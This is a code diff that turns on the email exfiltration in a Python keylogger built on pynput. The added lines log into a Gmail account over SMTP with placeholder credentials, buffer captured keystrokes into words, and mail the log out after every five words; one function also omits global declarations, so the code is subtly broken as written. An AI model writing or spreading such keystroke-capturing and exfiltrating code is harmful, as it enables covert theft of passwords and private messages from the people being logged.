@@ -10,7 +10,6 @@ import smtplib #for sending email using SMTP protocol (gmail)
 
 from pynput.keyboard import Key, Listener # for keylogs
 
-
 ########################################################################
 #                                                                      #
 #                    Emailing keylog - Disabled                        #
@@ -19,20 +18,14 @@ from pynput.keyboard import Key, Listener # for keylogs
 
 # email which receives the keystrokes 
 
-# email = 'your@gmail.com'
-# password = 'password'
-# server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-# server.login(email, password)
-
-# full_log = ""
-# word = ""
-# email_char_limit = 60 
-
-# set how many charcters to store before sending
+email = 'your@gmail.com'
+password = 'your password'
+server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+server.login(email, password)
 
 ########################################################################
 #                                                                      #
-#                Keylogging function - In Progress                     #
+#                      Keylogging function                             #
 #                                                                      #
 ########################################################################
 
@@ -40,10 +33,59 @@ from pynput.keyboard import Key, Listener # for keylogs
 count = 0
 keys = []
 
+# storing keys for email
+full_log = ""
+word = ""
+email_word_limit = 5
+
 # Function for when key is pressed
 def on_press(key):
-    global keys, count
+    global keys, count, full_log, word, email_word_limit
 
+    # file logging
+    # logging_file(key)
+    
+    # emailing log
+    email_log(key)
+
+########################################################################
+#                                                                      #
+#                      Emailing Logged Data                            #
+#                                                                      #
+########################################################################
+
+def email_log(key):
+    # checking in terminal
+    print("{0} pressed".format(key))
+    
+
+    clean_key = str(key).replace("'","")
+    if key == Key.space or key == Key.enter:
+        word += ' '
+        full_log += word
+        word = ''
+        if len(full_log.split()) >= email_word_limit:
+            send_log()
+            full_log = ''
+    elif key == Key.shift_l or key == Key.shift_r:
+        return
+    elif key == Key.backspace:
+        word = word[:-1]
+    elif clean_key.find("Key") != -1:
+        word += ' '
+        word += clean_key
+        word += ' '
+    else:
+        word += str(key).replace("'","")
+
+########################################################################
+#                                                                      #
+#                      Logging keys into a file                        #
+#                                                                      #
+########################################################################
+
+# for logging into file
+def logging_file(key):
     # storing keys and increasing count in file
     keys.append(key)
     count += 1
@@ -87,17 +129,16 @@ def on_release(key):
 #                                                                      #
 ########################################################################
 # send the Code that Sends the Append Keys is Press
-# def send_log():
-#     server.sendmail(
-#         email,
-#         email,
-#         full_log
-#     )
-
+def send_log():
+    server.sendmail(
+        email,
+        email,
+        full_log
+    )
 
 ########################################################################
 #                                                                      #
-#                    With Listener                                     #
+#                            With Listener                             #
 #                                                                      #
 ########################################################################
 with Listener(on_press=on_press, on_release=on_release) as listener:
